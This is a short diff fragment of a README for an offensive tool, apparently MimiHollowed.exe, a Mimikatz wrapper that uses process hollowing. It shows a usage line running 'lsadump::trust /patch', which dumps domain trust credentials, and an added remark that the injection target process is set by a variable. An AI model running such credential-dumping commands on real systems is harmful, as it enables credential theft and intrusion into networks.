@@ -11,3 +11,6 @@ DUMMY USAGE EXAMPLE (you can wrap any command in double quotes if it contains sp
 ```
 MimiHollowed.exe coffee "lsadump::trust /patch" coffee 
 ```
+
+If you want to change the process you will inject to, you just have to change this variable DEFINED above main
+
